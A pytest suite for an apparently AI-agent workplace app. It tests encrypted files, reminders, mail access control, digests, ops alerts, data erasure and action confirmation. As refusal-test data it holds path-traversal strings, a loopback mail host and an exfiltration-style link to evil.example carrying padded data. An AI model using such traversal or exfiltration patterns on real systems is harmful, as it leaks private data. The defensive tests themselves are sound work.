"""Agents' files, reminders, mail summaries and digests; private-chat confirmations; ops alerts;
erasing a person's data."""
from __future__ import annotations

import datetime as dt
import json
import os
from contextlib import contextmanager

import pytest
from fastapi.testclient import TestClient
from langgraph.checkpoint.memory import MemorySaver
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app.acl.engine import ACLEngine
from app.acl.models import Action, Resource, Subject
from app.auth.security import issue_token
from app.db.session import (
    Base,
    ChatThread,
    Notification,
    OpsAlert,
    Reminder,
    User,
    UserFile,
    get_session,
)
from app.departments.registry import seed_departments
from app.llm import client as llm
from app.mail import summary
from app.main import app
from app.orchestrator import execution, nodes, tools
from app.orchestrator.context import user_key
from app.orchestrator.graph import build_graph
from app.reminders import digest, service
from app.reminders import when as when_
from app.storage import deptfiles, objects, userfiles
from app.vault.aesgcm_vault import AESGCMVault

UTC = dt.timezone.utc
NOW = dt.datetime(2026, 11, 3, 6, 0, tzinfo=UTC)  # 11:30 in Asia/Kolkata, a Tuesday
KEY = os.urandom(32)


# ---- fixtures ----
@pytest.fixture
def db(monkeypatch):
    engine = create_engine("sqlite://", poolclass=StaticPool, connect_args={"check_same_thread": False})
    Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine, expire_on_commit=False)
    with Session() as s:
        seed_departments(s)
        s.add(User(id="alice", username="alice", password_hash="x", roles=["researcher"], prefs={}))
        s.add(User(id="root", username="root", password_hash="x", roles=["admin"], prefs={}))
        s.commit()
    monkeypatch.setattr(tools, "SessionLocal", Session)
    monkeypatch.setattr(nodes, "SessionLocal", Session)
    return Session


@pytest.fixture
def store(monkeypatch):
    """An in-memory object store behind userfiles, deptfiles and objects."""
    blobs: dict[str, bytes] = {}

    class Stat:
        def __init__(self, key):
            self.key = key

    monkeypatch.setattr(userfiles, "_put", lambda k, d: blobs.__setitem__(k, d))
    monkeypatch.setattr(userfiles, "_get", lambda k: blobs[k])
    monkeypatch.setattr(userfiles, "_remove", lambda k: blobs.pop(k, None))
    monkeypatch.setattr(objects, "put_system_object", lambda k, d: blobs.__setitem__(k, d))
    monkeypatch.setattr(objects, "get_system_object", lambda k: blobs[k])
    monkeypatch.setattr(objects, "remove_expired_object", lambda k: blobs.pop(k, None))
    monkeypatch.setattr(objects, "system_object_size", lambda k: len(blobs[k]) if k in blobs else None)
    monkeypatch.setattr(
        objects, "list_system_objects",
        lambda prefix: [(k, len(v), NOW) for k, v in sorted(blobs.items()) if k.startswith(prefix)],
    )

    class FakeStore:
        def __init__(self, acl):
            self._acl = acl

        def put(self, subject, key, data, content_type="application/octet-stream"):
            self._acl.enforce(subject, Action.WRITE, objects.resource_for(key))
            blobs[key] = data

        def get(self, subject, key):
            self._acl.enforce(subject, Action.READ, objects.resource_for(key))
            return blobs[key]

        def delete(self, subject, key):
            self._acl.enforce(subject, Action.DELETE, objects.resource_for(key))
            blobs.pop(key, None)

    monkeypatch.setattr(objects, "ObjectStore", FakeStore)
    return blobs


def _private(subject="alice", roles=("researcher",)):
    return {"subject_id": subject, "subject_roles": list(roles), "scratchpad": {"mode": "single"}}


def _work(department, subject="alice"):
    return {"subject_id": subject, "subject_roles": [department], "scratchpad": {"department": department}}


@pytest.fixture
def my_key():
    token = user_key.set(KEY)
    yield KEY
    user_key.reset(token)


# ---- when ----
@pytest.mark.parametrize(("text", "local"), [
    ("tomorrow 9am", "2026-11-04 09:00"),
    ("in 2 hours", "2026-11-03 13:30"),
    ("friday 17:30", "2026-11-06 17:30"),
    ("next monday", "2026-11-09 09:00"),
    ("2026-11-05", "2026-11-05 09:00"),
    ("2026-11-05 14:15", "2026-11-05 14:15"),
    ("10:00", "2026-11-04 10:00"),
    ("tonight", "2026-11-03 21:00"),
])
def test_reminder_times_are_read_in_the_persons_timezone(text, local):
    got = when_.parse(text, NOW, "Asia/Kolkata").astimezone(dt.timezone(dt.timedelta(hours=5, minutes=30)))
    assert got.strftime("%Y-%m-%d %H:%M") == local


@pytest.mark.parametrize("text", ["yesterday", "2026-11-01 09:00", "", "whenever"])
def test_unreadable_or_past_times_explain_what_to_send(text):
    with pytest.raises(ValueError, match="past|tomorrow|say when|what time"):
        when_.parse(text, NOW, "Asia/Kolkata")


def test_repeats_keep_the_local_time_and_skip_weekends():
    friday = dt.datetime(2026, 11, 6, 3, 30, tzinfo=UTC)
    assert when_.next_occurrence(friday, "weekdays", "Asia/Kolkata").date() == dt.date(2026, 11, 9)
    jan31 = dt.datetime(2026, 1, 31, 3, 30, tzinfo=UTC)
    assert when_.next_occurrence(jan31, "monthly", "Asia/Kolkata").date() == dt.date(2026, 2, 28)
    assert when_.next_occurrence(friday, "none", "Asia/Kolkata") is None


# ---- personal files ----
def test_personal_files_are_encrypted_versioned_and_restorable(db, store):
    with db() as s:
        userfiles.write(s, KEY, "alice", "notes/todo.md", b"- milk\n")
        userfiles.write(s, KEY, "alice", "notes/todo.md", b"- milk\n- eggs\n")
        info, data = userfiles.read(s, KEY, "alice", "notes//todo.md")
        assert data == b"- milk\n- eggs\n" and info.version == 2
        # Neither the path nor the content is stored in the clear.
        row = s.query(UserFile).one()
        assert "todo" not in row.encrypted_path
        assert all(b"milk" not in blob for blob in store.values())
        # Undo the last change.
        userfiles.restore(s, KEY, "alice", "notes/todo.md")
        assert userfiles.read(s, KEY, "alice", "notes/todo.md")[1] == b"- milk\n"
        # Delete goes to the trash and comes back.
        userfiles.delete(s, "alice", KEY, "notes/todo.md")
        assert userfiles.list_files(s, KEY, "alice") == []
        assert [f.path for f in userfiles.list_files(s, KEY, "alice", trash=True)] == ["notes/todo.md"]
        assert "trash" in userfiles.restore(s, KEY, "alice", "notes/todo.md")
        assert [f.path for f in userfiles.list_files(s, KEY, "alice")] == ["notes/todo.md"]


def test_another_key_or_owner_sees_nothing(db, store):
    with db() as s:
        userfiles.write(s, KEY, "alice", "a.txt", b"secret")
        assert userfiles.list_files(s, os.urandom(32), "alice") == []
        assert userfiles.list_files(s, KEY, "bob") == []
        assert userfiles.read_by_id(s, KEY, "bob", s.query(UserFile).one().id) is None


@pytest.mark.parametrize("path", ["../x", "a/../../b", "", "/"])
def test_bad_paths_are_refused(path):
    with pytest.raises(userfiles.FileError):
        userfiles.normalize(path)


def test_old_versions_are_capped_and_trash_is_purged(db, store):
    with db() as s:
        for i in range(userfiles.MAX_VERSIONS + 3):
            userfiles.write(s, KEY, "alice", "log.txt", f"v{i}".encode())
        assert len(s.query(UserFile).one().versions) == userfiles.MAX_VERSIONS
        assert len([k for k in store if k.startswith("userfiles/")]) == userfiles.MAX_VERSIONS
        userfiles.delete(s, "alice", KEY, "log.txt")
        assert userfiles.purge_trash(s, now=dt.datetime.now(UTC) + dt.timedelta(days=8)) == 1
        assert not [k for k in store if k.startswith("userfiles/")]


# ---- file tools ----
def test_file_tools_in_private_chat_work_on_my_files(db, store, my_key):
    st = _private()
    assert "Created" in tools.write_file(st, "plan.md", "# Plan\nStep one\n")
    assert "Step one" in tools.read_file(st, "plan.md")
    assert "Replaced 1" in tools.edit_file(st, "plan.md", "Step one", "Step 1")
    assert "Step 1" in tools.read_file(st, "plan.md")
    assert "not in" in tools.edit_file(st, "plan.md", "nope", "x")
    tools.append_file(st, "plan.md", "Step 2")
    assert "Step 1\nStep 2" in tools.read_file(st, "plan.md")
    assert "Moved" in tools.move_file(st, "plan.md", "work/plan.md")
    assert "work/plan.md" in tools.list_files(st)
    assert "earlier version" not in tools.restore_file(st, "work/plan.md")
    assert "trash" in tools.delete_file(st, "work/plan.md")


def test_file_tools_without_the_key_say_so(db, store):
    assert "only available" in tools.list_files(_private())


def test_long_files_are_read_in_parts(db, store, my_key, monkeypatch):
    monkeypatch.setattr(tools, "_max_chars", lambda: 10)
    tools.write_file(_private(), "long.txt", "0123456789abcdefghij")
    first = tools.read_file(_private(), "long.txt")
    assert "0123456789" in first and "start=10" in first
    assert "abcdefghij" in tools.read_file(_private(), "long.txt", 10)


def test_department_files_land_in_the_shared_folder_and_follow_the_acl(db, store):
    assert deptfiles.key_for("budget.csv", "account") == "shared/account/budget.csv"
    assert deptfiles.key_for("research/q3.md", "researcher") == "research/q3.md"
    acc = _work("account")
    assert "Created 'shared/account/budget.csv'" in tools.write_file(acc, "budget.csv", "a,b\n1,2\n")
    assert "1,2" in tools.read_file(acc, "budget.csv")
    assert "Saved a new version" in tools.write_file(acc, "budget.csv", "a,b\n3,4\n")
    assert "previous version" in tools.restore_file(acc, "budget.csv")
    assert "1,2" in tools.read_file(acc, "budget.csv")
    # HR can't reach account's folder, even by naming it.
    assert tools.read_file(_work("hr"), "shared/account/budget.csv").startswith("ACCESS DENIED")
    assert tools.write_file(_work("hr"), "shared/account/x.txt", "x").startswith("ACCESS DENIED")
    # Undo copies and other people's encrypted files never show in a listing.
    assert "_versions" not in tools.list_files(_work("admin"), "shared/")


def test_deleting_a_file_always_needs_a_go_ahead():
    from app.departments.packs import critical_tools

    assert "delete_file" in critical_tools() and "send_mail" in critical_tools()


# ---- reminders ----
def test_reminders_are_encrypted_listed_and_cancelled(db):
    with db() as s:
        row, due = service.create(s, "alice", "tomorrow 9am", "Call the bank", now=NOW)
        assert "Call the bank" not in s.get(Reminder, row.id).encrypted_text
        assert due.startswith("Wed 4 Nov 2026, 09:00")
        assert [r["text"] for r in service.pending(s, "alice")] == ["Call the bank"]
        assert service.pending(s, "root") == []
        assert not service.cancel(s, "root", row.id)
        assert service.cancel(s, "alice", row.id[:8])
        assert service.pending(s, "alice") == []


def test_due_reminders_become_notifications_and_repeat(db):
    sent = []
    with db() as s:
        service.create(s, "alice", "in 1 hour", "Stand up", repeat="daily", email=True, now=NOW)
        assert service.deliver_due(s, now=NOW, emailer=lambda *a: sent.append(a)) == 0
        later = NOW + dt.timedelta(hours=1, minutes=1)
        assert service.deliver_due(s, now=later, emailer=lambda *a: sent.append(a) or True) == 1
        notes = service.notifications(s, "alice")
        assert [n["title"] for n in notes] == ["Stand up"] and notes[0]["kind"] == "reminder"
        assert len(sent) == 1
        row = s.query(Reminder).one()
        assert row.state == "pending" and row.due_at.replace(tzinfo=UTC) > later  # tomorrow, same time
        assert service.unread_count(s, "alice") == 1
        service.mark_read(s, "alice")
        assert service.unread_count(s, "alice") == 0


def test_reminder_tools_act_for_the_caller(db):
    assert "Reminder" in tools.set_reminder(_private(), "tomorrow 9am", "Pay rent", "monthly")
    listing = tools.list_reminders(_private())
    assert "Pay rent" in listing and "monthly" in listing
    assert tools.list_reminders(_private("root", ("admin",))) == "No reminders are waiting."
    rid = listing.split(":")[0]
    assert "Cancelled" in tools.cancel_reminder(_private(), rid)
    assert "ERROR" in tools.set_reminder(_private(), "last year", "x")


# ---- mail ----
def test_private_chat_reaches_own_mail_and_member_department_mail_only(db, monkeypatch):
    from app.mail import connector

    # Not in Accounts: no finance mail, private or not.
    assert tools.read_mail(_private(), "finance").startswith("ACCESS DENIED")
    assert "personal mailbox" in tools.read_mail(_private())  # not connected yet: says how to connect

    box = json.dumps({"imap_host": "imap.example.com", "username": "u", "password": "p"})
    with db() as s:
        AESGCMVault(s).put("mail/finance", box.replace('"u"', '"finance@techwiser.com"'))
        AESGCMVault(s).put("mail/personal/asha", box.replace('"u"', '"asha@gmail.com"'))
        s.add(User(id="asha", username="asha", password_hash="x", roles=["account"], prefs={}))
        s.commit()
    monkeypatch.setattr(connector, "check_servers", lambda cfg: None)
    monkeypatch.setattr(connector, "list_messages", lambda cfg, *a: f"inbox of {cfg.username}")
    asha = {"subject_id": "asha", "subject_roles": ["account"], "scratchpad": {"mode": "single"}}

    # Two mailboxes and no choice made: the agent is told to ask, and nothing is read.
    ask = tools.read_mail(asha)
    assert ask.startswith("ASK THE PERSON FIRST") and "finance@techwiser.com" in ask and "asha@gmail.com" in ask
    assert "inbox of finance@techwiser.com" in tools.read_mail(asha, "finance")
    assert "inbox of finance@techwiser.com" in tools.read_mail(asha, "finance@techwiser.com")
    assert "inbox of asha@gmail.com" in tools.read_mail(asha, "personal")
    assert "finance: finance@techwiser.com" in tools.list_mailboxes(asha)
    # Members may also mark and send from it (sending is confirmed on a card that names the mailbox).
    monkeypatch.setattr(connector, "set_flag", lambda cfg, *a: f"marked in {cfg.username}")
    monkeypatch.setattr(connector, "send", lambda cfg, *a: f"sent from {cfg.sender}")
    assert tools.mark_mail(asha, "1", "read", "finance") == "marked in finance@techwiser.com"
    assert tools.send_mail(asha, "x@y.com", "hi", "body", "finance") == "sent from finance@techwiser.com"
    assert tools.send_mail(asha, "x@y.com", "hi", "body").startswith("ASK THE PERSON FIRST")
    alice = _private()
    assert tools.send_mail(alice, "x@y.com", "hi", "body", "finance").startswith("ACCESS DENIED")
    from app.api.routes_chat import confirm_out
    card = confirm_out({"tool": "send_mail", "args": {"to": "x@y.com", "subject": "hi", "body": "b", "category": "finance"}})
    assert card.details["from"].startswith("finance") and "category" not in card.details
    # At work in Accounts the department's own mailbox is the default: no question.
    at_work = {**asha, "scratchpad": {"department": "account"}}
    assert "inbox of finance@techwiser.com" in tools.read_mail(at_work)


def test_the_admin_can_use_their_own_mail_but_not_anyone_elses(db):
    with db() as s:
        acl = ACLEngine(s)
        admin = Subject("root", ("admin",))
        assert acl.check(admin, Action.READ, Resource("mail", "personal/root/inbox")).allowed
        assert not acl.check(admin, Action.READ, Resource("mail", "personal/alice/inbox")).allowed
        assert not acl.check(admin, Action.READ, Resource("secret", "mail/personal/alice")).allowed
        assert not acl.check(admin, Action.READ, Resource("secret", "system/notes-key")).allowed


def test_user_configured_mail_servers_must_be_public():
    from app.mail.connector import MailConfig, check_servers

    with pytest.raises(ValueError):
        check_servers(MailConfig("127.0.0.1", "u", "p", guarded=True))
    with pytest.raises(ValueError, match="port"):
        check_servers(MailConfig("imap.example.com", "u", "p", imap_port=5432, guarded=True))


MAILS = [
    {"id": "11", "message_id": "<a@x>", "from": "Landlord", "subject": "Rent due", "date": "Mon, 2 Nov 2026",
     "unread": True, "attachments": [], "body": "Please pay rent by Friday."},
    {"id": "12", "message_id": "<b@x>", "from": "Shop", "subject": "50% off!", "date": "Mon, 2 Nov 2026",
     "unread": True, "attachments": [], "body": "Sale"},
]


def _analysis(messages, chat=None):
    reply = json.dumps([
        {"id": "11", "gist": "Landlord asks for rent", "action": "Pay rent", "deadline": "2026-11-06", "urgent": True, "kind": "bill"},
        {"id": "12", "gist": "A sale", "action": "", "deadline": "", "urgent": False, "kind": "promotion"},
    ])
    return summary._parse(reply, messages)


def test_mail_summaries_put_actions_first_and_fold_promotions():
    text = summary.render(_analysis(MAILS))
    assert text.index("Rent due") < text.index("newsletter/promotional")
    assert "To do: Pay rent (by 2026-11-06)" in text and "URGENT" in text


def test_bad_model_output_still_lists_every_email():
    items = summary._parse("not json", MAILS)
    assert [i["id"] for i in items] == ["11", "12"] and not any(i["deadline"] for i in items)


def test_digest_summarizes_and_sets_one_reminder_per_deadline(db):
    with db() as s:
        AESGCMVault(s).put("mail/personal/alice", json.dumps({"imap_host": "imap.example.com", "username": "a@x.com", "password": "p"}))
        user = s.get(User, "alice")
        user.prefs = {"digest_hour": 8}
        s.commit()
        assert digest.is_due(user, NOW)  # 11:30 local, after 8:00, never run
        body = digest.run_for(s, user, NOW, fetch=lambda *a: MAILS, analyse=_analysis)
        assert "Pay rent" in body and "Reminders I set" in body
        assert not digest.is_due(user, NOW + dt.timedelta(hours=1))  # once a day
        digest.run_for(s, user, NOW, fetch=lambda *a: MAILS, analyse=_analysis)
        reminders = s.query(Reminder).filter(Reminder.source == "mail").all()
        assert len(reminders) == 1  # the rerun didn't add it again
        # Due the morning before the deadline, at the digest hour.
        assert reminders[0].due_at.replace(tzinfo=UTC) == dt.datetime(2026, 11, 5, 2, 30, tzinfo=UTC)
        assert [n["kind"] for n in service.notifications(s, "alice")] == ["digest", "digest"]


def test_digest_reports_an_unreachable_mailbox(db):
    def broken(*a):
        raise OSError("down")

    with db() as s:
        AESGCMVault(s).put("mail/personal/alice", json.dumps({"imap_host": "imap.example.com", "username": "a@x.com", "password": "p"}))
        user = s.get(User, "alice")
        assert "couldn't read your mailbox" in digest.run_for(s, user, NOW, fetch=broken, analyse=_analysis)


# ---- ops alerts ----
def test_alerts_notify_the_admin_once_when_firing_and_once_when_resolved(db):
    from app.api.routes_ops import AlertIn, record

    firing = AlertIn(labels={"alertname": "DiskAlmostFull", "severity": "warning"},
                     annotations={"summary": "disk"}, endsAt=NOW + dt.timedelta(minutes=5))
    resolved = AlertIn(labels=firing.labels, annotations=firing.annotations, endsAt=NOW - dt.timedelta(minutes=1))
    with db() as s:
        assert record(s, [firing], NOW) == 1
        assert record(s, [firing], NOW) == 0  # Prometheus resends: no new notice
        assert record(s, [resolved], NOW) == 1
        assert s.query(OpsAlert).one().state == "resolved"
        titles = [n["title"] for n in service.notifications(s, "root")]
        assert titles == ["Resolved: DiskAlmostFull", "Server alert (warning): DiskAlmostFull"]
        assert service.notifications(s, "alice") == []


def test_alert_endpoint_needs_the_token(monkeypatch):
    from app.api import routes_ops
    from app.config import get_settings

    monkeypatch.setattr(get_settings(), "alert_webhook_token", "right-token")
    with pytest.raises(Exception, match="401|bad alert token"):
        routes_ops._authorized("Bearer wrong")
    with pytest.raises(Exception, match="401|bad alert token"):
        routes_ops._authorized(None)
    routes_ops._authorized("Bearer right-token")


# ---- erasing a person's data ----
def test_erase_removes_a_persons_data_and_keys(db, store):
    from app.privacy import erase_user

    with db() as s:
        userfiles.write(s, KEY, "alice", "a.txt", b"x")
        service.create(s, "alice", "tomorrow", "x", now=NOW)
        service.notify(s, "alice", "reminder", "x")
        s.add(ChatThread(owner_id="alice", thread_id="t", encrypted_title="t"))
        AESGCMVault(s).put("mail/personal/alice", "{}")
        s.commit()
        counts = erase_user(s, "alice", remove_object=lambda k: None)
        assert counts["files"] == 1 and counts["chats"] == 1
        assert s.query(UserFile).count() == s.query(Reminder).count() == s.query(Notification).count() == 0
        assert AESGCMVault(s).get("mail/personal/alice") is None
        assert s.get(User, "alice") is not None and s.get(User, "alice").wrapped_chat_key is None
        erase_user(s, "alice", delete_account=True, remove_object=lambda k: None)
        assert s.get(User, "alice") is None
        assert not [k for k in store if k.startswith("userfiles/alice")]


# ---- confirming an action in a private chat ----
@pytest.fixture
def client(db, store, monkeypatch):
    def _get_session():
        with db() as s:
            yield s

    saver = MemorySaver()
    plain = saver.serde

    @contextmanager
    def _cm(mode, serde=None):
        saver.serde = serde or plain
        yield build_graph().compile(checkpointer=saver)

    monkeypatch.setattr(execution, "_graph_cm", _cm)
    app.dependency_overrides[get_session] = _get_session
    yield TestClient(app)
    app.dependency_overrides.clear()


@pytest.fixture
def replies(monkeypatch):
    queue: list = []

    def _chat(messages, **kwargs):
        return queue.pop(0) if queue else "ok"

    monkeypatch.setattr(llm, "chat", _chat)
    return queue


ALICE = {"authorization": "Bearer " + issue_token("alice", "alice", ["researcher"], chat_key=KEY)}


def test_a_private_delete_waits_for_the_persons_own_confirmation(client, db, replies):
    with db() as s:
        userfiles.write(s, KEY, "alice", "old.txt", b"bye")
    call = json.dumps({"tool": "delete_file", "args": {"path": "old.txt"}})

    replies[:] = [call]
    body = client.post("/v1/chat", headers=ALICE, json={"message": "delete old.txt", "thread_id": "t1"}).json()
    assert body["outcome"] == "confirm" and body["confirm"]["details"]["path"] == "old.txt"
    assert client.get("/v1/chat/threads/t1/pending", headers=ALICE).json()["tool"] == "delete_file"
    with db() as s:
        assert [f.path for f in userfiles.list_files(s, KEY, "alice")] == ["old.txt"]  # not yet

    replies[:] = ["Deleted it."]
    done = client.post("/v1/chat/threads/t1/confirm", headers=ALICE, json={"approve": True}).json()
    assert done["reply"] == "Deleted it."
    with db() as s:
        assert userfiles.list_files(s, KEY, "alice") == []
    assert client.get("/v1/chat/threads/t1/pending", headers=ALICE).json() is None
    assert client.post("/v1/chat/threads/t1/confirm", headers=ALICE, json={"approve": True}).status_code == 409


def test_declining_or_moving_on_does_not_run_the_action(client, db, replies):
    with db() as s:
        userfiles.write(s, KEY, "alice", "keep.txt", b"x")
    call = json.dumps({"tool": "delete_file", "args": {"path": "keep.txt"}})
    replies[:] = [call]
    client.post("/v1/chat", headers=ALICE, json={"message": "delete keep.txt", "thread_id": "t2"})
    replies[:] = ["Okay, kept it.", "Hello!"]
    # A new message instead of confirming counts as "no".
    assert client.post("/v1/chat", headers=ALICE, json={"message": "hi", "thread_id": "t2"}).json()["reply"] == "Hello!"
    with db() as s:
        assert [f.path for f in userfiles.list_files(s, KEY, "alice")] == ["keep.txt"]


# ---- personal API ----
def test_reminder_and_notification_endpoints(client, db):
    r = client.post("/v1/reminders", headers=ALICE, json={"when": "in 2 hours", "text": "Stretch"})
    assert r.status_code == 201
    assert [x["text"] for x in client.get("/v1/reminders", headers=ALICE).json()] == ["Stretch"]
    assert client.post("/v1/reminders", headers=ALICE, json={"when": "never", "text": "x"}).status_code == 422
    with db() as s:
        service.notify(s, "alice", "reminder", "Hi")
    assert client.get("/v1/notifications/count", headers=ALICE).json() == {"unread": 1}
    assert client.post("/v1/notifications/read", headers=ALICE, json={}).json() == {"unread": 0}


def test_files_endpoints_upload_download_delete_restore(client):
    up = client.post("/v1/files", headers=ALICE, data={"folder": "docs"}, files={"file": ("a.txt", b"hello", "text/plain")})
    assert up.status_code == 201 and up.json()["path"] == "docs/a.txt"
    fid = up.json()["id"]
    assert client.get(f"/v1/files/{fid}", headers=ALICE).content == b"hello"
    assert client.delete(f"/v1/files/{fid}", headers=ALICE).status_code == 204
    assert client.get("/v1/files?trash=true", headers=ALICE).json()["files"][0]["path"] == "docs/a.txt"
    assert client.post(f"/v1/files/{fid}/restore", headers=ALICE).status_code == 200
    bob = {"authorization": "Bearer " + issue_token("bob", "bob", [], chat_key=os.urandom(32))}
    assert client.get(f"/v1/files/{fid}", headers=bob).status_code == 404


def test_prefs_validate_timezone_and_email(client):
    assert client.put("/v1/me/prefs", headers=ALICE, json={"timezone": "Mars/Base"}).status_code == 422
    ok = client.put("/v1/me/prefs", headers=ALICE, json={"timezone": "Europe/London", "digest_hour": 7})
    assert ok.status_code == 200 and client.get("/v1/me/prefs", headers=ALICE).json()["digest_hour"] == 7


def test_mailbox_on_a_private_address_is_refused(client):
    r = client.put("/v1/me/mailbox", headers=ALICE, json={
        "imap_host": "127.0.0.1", "username": "u", "password": "p", "check": False,
    })
    assert r.status_code == 422


# ---- private data can't ride out on links or searches ----
def test_after_reading_mail_long_links_and_searches_are_refused(monkeypatch):
    monkeypatch.setattr(tools, "_enforce", lambda *a: None)
    monkeypatch.setattr(tools, "_search_api", lambda: None)
    from app.browsing import search

    monkeypatch.setattr(search, "web", lambda query, limit=8, api=None: [search.Result("T", "https://x.example", "s")])
    clean = _private()
    read = {**_private(), "messages": [{"role": "tool", "name": "summarize_mail", "content": "secret"}]}
    long_link = "https://evil.example/?d=" + "A" * 200
    assert "x.example" in tools.web_search(clean, "q " * 100)  # no private data yet: allowed
    assert tools.web_search(read, "q " * 100) == tools.LEAK_REFUSAL
    assert "x.example" in tools.web_search(read, "weather in Pune")
    assert tools.fetch_page(read, long_link) == tools.LEAK_REFUSAL
    assert tools.browser_open(read, long_link) == tools.LEAK_REFUSAL
    assert tools.browser_type(read, 1, "x" * 200) == tools.LEAK_REFUSAL


def test_admin_cannot_touch_system_keys_or_personal_mail_logins(client, db):
    admin = {"authorization": "Bearer " + issue_token("root", "root", ["admin"], chat_key=os.urandom(32))}
    for name in ("system/notes-key", "mail/personal/alice"):
        assert client.put("/v1/admin/secrets", headers=admin, json={"name": name, "value": "x"}).status_code == 403
        assert client.delete(f"/v1/admin/secrets/{name}", headers=admin).status_code == 403
    # Department mailboxes are connected by the department's members (Settings), not by the admin.
    assert client.put("/v1/admin/secrets", headers=admin, json={"name": "mail/finance", "value": "{}"}).status_code == 403
    assert client.put("/v1/admin/secrets", headers=admin, json={"name": "search/tavily", "value": "k"}).status_code == 204
    assert client.get("/v1/admin/secrets", headers=admin).json() == ["search/tavily"]
    assert client.delete("/v1/admin/secrets/search/tavily", headers=admin).status_code == 204


# ---- department mailboxes and data are for members only (owner, 2026-11-04) ----
def _hdr(user, *roles):
    return {"authorization": "Bearer " + issue_token(user, user, list(roles), chat_key=os.urandom(32))}


def test_a_department_mailbox_is_managed_by_its_members_only(client, db, monkeypatch):
    from app.api import routes_me
    from app.mail import connector

    monkeypatch.setattr(connector, "check_servers", lambda cfg: None)
    monkeypatch.setattr(connector, "check_login", lambda cfg: None)
    body = {"address": "finance@techwiser.com", "password": "app-password",
            "imap_host": "imap.example.com", "smtp_host": "smtp.example.com", "smtp_port": 465}
    for outsider in (_hdr("root", "admin"), _hdr("sam", "superuser"), _hdr("hana", "hr")):
        assert client.put("/v1/me/mailbox?box=finance", headers=outsider, json=body).status_code == 403
        assert client.get("/v1/me/mailbox?box=finance", headers=outsider).status_code == 403
        assert client.delete("/v1/me/mailbox?box=finance", headers=outsider).status_code == 403
    accounts = _hdr("asha", "account")
    assert client.put("/v1/me/mailbox?box=finance", headers=accounts, json=body).json()["connected"]
    with db() as s:
        assert AESGCMVault(s).get("mail/finance") is not None
        assert AESGCMVault(s).get("mail/personal/asha") is None  # not mixed up with her own
    assert [m["box"] for m in client.get("/v1/me/department-mailboxes", headers=accounts).json()] == ["finance"]
    assert [m["box"] for m in client.get("/v1/me/department-mailboxes", headers=_hdr("root", "admin")).json()] == ["contact"]
    assert client.get("/v1/me/department-mailboxes", headers=_hdr("sam", "superuser")).json() == []
    assert client.put("/v1/me/mailbox?box=nonsense", headers=accounts, json=body).status_code == 404
    assert routes_me._pending_box == {}


def test_the_admin_cannot_grant_department_data_by_policy(client, db):
    admin = _hdr("root", "admin")
    for resource in ("mail:finance/*", "shared:account/*", "accounts:*", "template:hr/*", "*", "secret:mail/finance"):
        r = client.post("/v1/admin/policies", headers=admin,
                        json={"subject": "admin", "effect": "allow", "action": "read", "resource": resource})
        assert r.status_code == 403, resource
    ok = client.post("/v1/admin/policies", headers=admin,
                     json={"subject": "admin", "effect": "allow", "action": "read", "resource": "inventory:widgets"})
    assert ok.status_code == 201


# ---- department files in the Files tab (2026-11-04: a sheet saved to shared/hr/ was invisible) ----
def test_department_files_are_listed_and_downloadable_by_members_only(client, db, store):
    store["shared/hr/applications.xlsx"] = b"sheet"
    store["shared/account/ledger.csv"] = b"money"
    hr = _hdr("hana", "hr")
    listed = client.get("/v1/department-files", headers=hr).json()
    assert [(f["department"], f["name"]) for f in listed] == [("hr", "applications.xlsx")]
    got = client.get("/v1/department-files/download", headers=hr,
                     params={"department": "hr", "path": "shared/hr/applications.xlsx"})
    assert got.status_code == 200 and got.content == b"sheet"
    # Not a member of accounts, the admin included: no listing, no download, not even by path tricks.
    for outsider in (hr, _hdr("root", "admin"), _hdr("sam", "superuser")):
        assert all(f["department"] != "account" for f in client.get("/v1/department-files", headers=outsider).json())
        assert client.get("/v1/department-files/download", headers=outsider,
                          params={"department": "account", "path": "shared/account/ledger.csv"}).status_code == 403
    assert client.get("/v1/department-files/download", headers=hr,
                      params={"department": "hr", "path": "shared/account/ledger.csv"}).status_code == 404


def test_members_can_upload_to_their_department_folder(client, db, store, monkeypatch):
    from app.request_manager import guards

    monkeypatch.setattr(guards, "is_nsfw", lambda text: (False, ""))
    hr = _hdr("hana", "hr")
    made = client.post("/v1/department-files", headers=hr, data={"department": "hr"},
                       files={"file": ("cv.txt", b"Ravi Kumar CV", "text/plain")})
    assert made.status_code == 201 and made.json()["path"] == "shared/hr/cv.txt"
    assert store["shared/hr/cv.txt"] == b"Ravi Kumar CV"
    assert client.post("/v1/department-files", headers=hr, data={"department": "account"},
                       files={"file": ("x.txt", b"x", "text/plain")}).status_code == 403
